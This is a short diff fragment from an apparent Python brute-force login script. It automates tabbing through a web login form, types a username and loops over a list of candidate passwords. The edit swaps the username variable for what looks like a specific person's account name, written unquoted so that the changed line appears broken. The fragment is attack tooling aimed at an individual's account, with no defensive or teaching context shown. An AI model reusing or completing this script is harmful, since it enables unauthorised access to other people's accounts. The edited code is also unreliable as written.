@@ -23,7 +23,7 @@ time.sleep(3)
 keyboard.press(Key.tab)
 keyboard.release(Key.tab)
 time.sleep(3)
-web.type(username)
+web.type(librahutajulu)
 keyboard.press(Key.tab)
 keyboard.release(Key.tab)
 for brute in bruteforce:
